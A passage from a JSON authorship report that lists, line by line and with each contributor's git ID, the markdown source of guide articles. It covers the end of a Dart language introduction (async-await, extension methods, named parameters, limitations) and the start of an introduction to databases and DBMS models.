          "gitId": "le0tan"
        },
        "content": "  f1.then((res1) {"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "le0tan"
        },
        "content": "    f2.then((res2) {"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "le0tan"
        },
        "content": "      print(res1 + \" \" + res2);"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "le0tan"
        },
        "content": "    });"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  });"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-inline.html?id\u003dff4a94d26a59c373b7cd94cd8df7094a\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "le0tan"
        },
        "content": "This time, after 2 seconds, two strings should be printed out at the same time. However, using `async-await`, there\u0027s a more elegant way to do the same thing:"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "le0tan"
        },
        "content": "main() {"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var f1 \u003d Future.delayed(Duration(seconds: 1), () \u003d\u003e \u0027String from the future\u0027);"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  var f2 \u003d Future.delayed(Duration(seconds: 2), () \u003d\u003e \u0027Must come second\u0027);"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  f1.then((res1) async {"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "le0tan"
        },
        "content": "    print(res1 + \" \" + await f2);"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  });"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-inline.html?id\u003d077d288e4a705324c4aa268810904305\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/panel\u003e"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Extension Methods"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Extension methods aim to solve one problem: when using an external library, you may want to extend or even change some of the methods for your own needs. For example, instead of using `int.parse(42)`, you want to extend the `String` class so that it has a method `parseInt()` to parse a string to int. You can easily do so by extending `String` class in Dart:"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "le0tan"
        },
        "content": "extension NumberParsing on String {"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  int parseInt() {"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "le0tan"
        },
        "content": "    return int.parse(this);"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  }"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "le0tan"
        },
        "content": "main(List\u003cString\u003e args) {"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  print(\u002742\u0027.parseInt());"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-inline.html?id\u003dc162704838776bb7da6568c3c1589f69\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Extending classes, especially core classes like `String`, could be quite tricky if not impossible without extension methods. However, in Dart, you can easily customize the behavior of built-in classes like so. Extension methods in Dart have even more interesting stuff like [generic support](https://dart.dev/guides/language/extension-methods#implementing-generic-extensions)."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Named Parameters"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "le0tan"
        },
        "content": "This is what makes declarative UI code written in Dart look surprisingly similar to JSON. In a language where the order of a function\u0027s parameters is specified by the function\u0027s definition, if you only look at the function call, it might be difficult for you to figure out what those parameters mean. One classic example is the `put(key, value)` of a Map data structure - if you only see `m.put(1, 2)`, can you tell which one is key without prior knowledge?"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "le0tan"
        },
        "content": "That\u0027s when named parameters become handy:"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "le0tan"
        },
        "content": "When calling a function, you can specify named parameters using `paramName: value`. For example:"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "le0tan"
        },
        "content": "enableFlags(bold: true, hidden: false);"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "le0tan"
        },
        "content": "When defining a function, use `{param1, param2, ...}` to specify named parameters:"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "le0tan"
        },
        "content": "/// Sets the [bold] and [hidden] flags ..."
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "le0tan"
        },
        "content": "void enableFlags({bool bold, bool hidden}) {...}"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Note that if named parameters are used, the order no longer matters, you can write `enableFlags(hidden: false, bold: true);` as well. This feature is especially useful for declarative UI as the properties of a widget are, most of the time, parameters passed to the constructor of the object. Below is a concrete example in Flutter. Imagine how messy and frustrating the code would look like if the parameters are not named and we have to refer to the documentation for the exact order of them!"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```dart"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "le0tan"
        },
        "content": "// Copyright 2018 The Flutter team. All rights reserved."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "le0tan"
        },
        "content": "// Use of this source code is governed by a BSD-style license that can be"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "le0tan"
        },
        "content": "// found in the LICENSE file."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "le0tan"
        },
        "content": "import \u0027package:flutter/material.dart\u0027;"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "le0tan"
        },
        "content": "void main() \u003d\u003e runApp(MyApp());"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "le0tan"
        },
        "content": "class MyApp extends StatelessWidget {"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  @override"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  Widget build(BuildContext context) {"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "le0tan"
        },
        "content": "    return MaterialApp("
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "le0tan"
        },
        "content": "      title: \u0027Welcome to Flutter\u0027,"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "le0tan"
        },
        "content": "      home: Scaffold("
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "le0tan"
        },
        "content": "        appBar: AppBar("
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "le0tan"
        },
        "content": "          title: Text(\u0027Welcome to Flutter\u0027),"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "le0tan"
        },
        "content": "        ),"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "le0tan"
        },
        "content": "        body: Center("
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "le0tan"
        },
        "content": "          child: Text(\u0027Hello World\u0027),"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "le0tan"
        },
        "content": "        ),"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "le0tan"
        },
        "content": "      ),"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "le0tan"
        },
        "content": "    );"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  }"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "le0tan"
        },
        "content": "}"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "le0tan"
        },
        "content": "```"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"DartPad example\" minimized\u003e\u003ciframe style\u003d\"width: 100%; height: 400px;\" src\u003d\"https://dartpad.dev/embed-flutter.html?id\u003d719143b1a625dbdefb853c96de0ddbc2\u0026split\u003d50\"\u003e\u003c/iframe\u003e\u003c/panel\u003e"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003cpanel header\u003d\"Optional reading: underlying implementation of *named parameters* in Dart\" minimized\u003e"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Actually, **named** parameters are a type of [**optional** parameters](https://dart.dev/guides/language/language-tour#optional-parameters) (i.e. you can omit those parameters and they will be assigned `null` or the default value upon entry of the function). You can also make use of [`@required`](https://pub.dev/documentation/meta/latest/meta/required-constant.html) annotation to make certain named parameters compulsory."
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/panel\u003e"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "le0tan"
        },
        "content": "## Current State"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "le0tan"
        },
        "content": "**Tooling support**: Dart has out-of-the-box dependency management ([pub.dev](https://pub.dev/)), linting solution ([dartfmt](https://dart.dev/tools/dartfmt)), documentation generator ([dartdoc](https://dart.dev/tools/dartdoc)) and [official testing framework](https://pub.dev/packages/test). After installing Dart SDK, you\u0027re ready to go 99% of the time."
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "le0tan"
        },
        "content": "**Popularity**: Dart is a relatively new (first appeared in 2011), but quickly gained popularity in recent years: it\u0027s ranked 16th the first time it entered the [IEEE Spectrum programming language ranking](https://spectrum.ieee.org/static/interactive-the-top-programming-languages-2019), and 23rd on [TIOBE](https://www.tiobe.com/tiobe-index/) as of April 2020. And Dart is being actively maintained by a team at Google: check out the [GitHub repo of Dart SDK](https://github.com/dart-lang/sdk)."
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Limitations"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Of course, like any other language, Dart is [not perfect](https://news.ycombinator.com/item?id\u003d16475074). "
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Even if Dart appears to be open-sourced, it has been pretty \u003ctooltip content\u003d\"meaning the community contribution is more limited to bug fixes instead of adding new features\"\u003einternally focused\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* And unlike Java, C++ or Python, although technically you can write most types of application using Dart, it may not be your safest choice a lot of the times (i.e. you may find yourself writing Dart in a Flutter project most of the time)."
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "le0tan"
        },
        "content": "## How to Get Started With Dart?"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Dart is well-documented and you should find solutions to most of your Dart problems on [their website](https://dart.dev/guides). "
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "le0tan"
        },
        "content": "Like many devs who tried Dart says, you might already know Dart. If you already have *any* prior programming experience in any language (say, C, C++, Java, JavaScript, Python, Kotlin, Swift), you\u0027re pretty likely to master Dart within weeks for the following reasons:"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Dart is using a C-style syntax: it won\u0027t be a surprise if a function written in Java can be compiled and run in Dart with minor (or no) changes."
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Dart is a **strongly-typed** language with type-inference support: static typing makes IDE much more helpful and if your program compiles, it most likely works just fine."
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* You may find your favorite syntax (sugar) in Dart, for example"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * Similar to JavaScript: arrow functions"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * Similar to Kotlin: `get` and `set` keywords for OOP, null safety syntax"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "le0tan"
        },
        "content": "### Getting Started"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Installation: You may get the Dart SDK [here](https://dart.dev/get-dart). Actually you don\u0027t even need to install the Dart SDK to play around with Dart (remember the interactive Dartpad example above?). You can have a guided tour within your browser to explore Dart [here](https://dart.dev/codelabs/dart-cheatsheet)."
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Get familiar with Dart with short examples [here](https://dart.dev/samples)."
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Syntax tour: [A tour of the Dart language](https://dart.dev/guides/language/language-tour)"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Essential concepts in Dart:"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Asynchronous programming using `futures`, `async`, `await`](https://dart.dev/codelabs/async-await)"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Asynchronous programming using streams](https://dart.dev/tutorials/language/streams)"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Dart type system](https://dart.dev/guides/language/sound-dart)"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "le0tan"
        },
        "content": "* Useful resources"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Core library tour of Dart](https://dart.dev/guides/libraries/library-tour)"
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Effective Dart](https://dart.dev/guides/language/effective-dart)"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Dart Academy](https://dart.academy/)"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "le0tan"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "le0tan"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "le0tan": 256,
      "jamessspanggg": 1
    }
  },
  {
    "path": "contents/data/databases/databases.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Databases \u0026 Database Management Systems (DBMS)"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Databases \u0026 Database Management Systems (DBMS)"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Syed Abdullah](https://github.com/Skaty)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why learn databases and DBMSes?‎](#why-learn-databases-and-dbmses)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Introduction‎](#introduction)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Database models‎](#database-models)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Why are there different models?‎](#why-are-there-different-models)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Examples of DBMS implementations‎](#examples-of-dbms-implementations)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Relations‎](#relations)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Transactions‎](#transactions)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [ACID in transactions‎](#acid-in-transactions)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Distributed Databases‎](#distributed-databases)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Database Abstractions and Languages‎](#database-abstractions-and-languages)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Relational Algebra‎](#relational-algebra)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Query Language and Abstractions‎](#query-language-and-abstractions)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Learn Databases and DBMSes?"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "The programs that we create would handle data in some way or another. Be it a simple calculator application that tabulates user calculations (and maybe store them in a log of recent calculation) or a cluster of servers that handle indexing of a large number of documents. Data is what is worked on by any program, the inputs and outputs of a program or even a simple function are data."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "As our programs get larger and the data that is worked on becomes much more complex, there needs to be a way for us to systematically store and access data that is being worked on. It could be a crude structure, designed specifically for a particular use case or something that is more standardised, for instance, an application that handles data."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "This notion of structuring data and providing an easy to use abstraction for accessing, storing and performing mundane operations on data (for instance, sorting them) is what this guide will cover."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "## Introduction"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "![DB-DBMS Relationship](images/db-dbms-relation.png)"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "A **database** is a collection of data. While any data in a medium can theoretically be a database (for instance, scribbling on a piece of paper), databases in the context of this chapter typically involve data that are organised in some manner."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "Programs generally do not access the raw data directly. Instead, a  **database management system (DBMS)** is used, which will handle the storage, retrieval and updating of the data."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "Sometimes people use the term database to refer to a DBMS. However, to avoid any confusion, this guide will use these terms as defined above."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "There are various concepts in the field of databases and DBMS and this guide will cover the basic concepts that are useful for someone who is starting out."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Database Models"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "For databases to make any sense, there has to be a certain logical structure in the database (for instance, how data is stored). This logical structure is known as a **database model**."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "There are many types of database models. Some examples are:"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "- [**Relational model**](https://en.wikipedia.org/wiki/Relational_model) - the most widely used database model, usually modeled using a table format. The data structure is defined by a set of relations and domains (types) that dictates the constraints. Constraints are also established for the type of operations that can be done."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "- [**Document-oriented**](https://en.wikipedia.org/wiki/Document-oriented_database) - data is stored in documents, that encapsulates the data. This data is normally stored in a semi-structured manner."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "- [**Key-value**](https://en.wikipedia.org/wiki/Key-value_database) - utilises a dictionary-like structure"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "- [**Graph database**](https://en.wikipedia.org/wiki/Graph_database) - utilises graph structures to store data"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "- [**Flat**](https://en.wikipedia.org/wiki/Flat_file_database) - data stored as files, without any structure"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "- [**Multi-model**](https://en.wikipedia.org/wiki/Multi-model_database) - DBMS that supports multiple database models"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "[Click here](https://en.wikipedia.org/wiki/Database_model) to learn more about the different database models."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Why are There Different Models?"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "There are advantages and disadvantages to utilising one of the many database models available. These different models seek to solve certain issues when programs deal with data."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "For instance, the relational model is the most structured out of the three that were shown. The presence of structure allows the database to enhance and improve certain common operations, for instance, searching for a specific data for an entry would be faster."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "However, having such a rigid structure would mean that there\u0027s a limitation on how and what kind of data can be stored in the database."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "For the purposes of introduction, we would mainly cover on aspects that are used in the relational and/or document-oriented database models."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Examples of DBMS Implementations"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
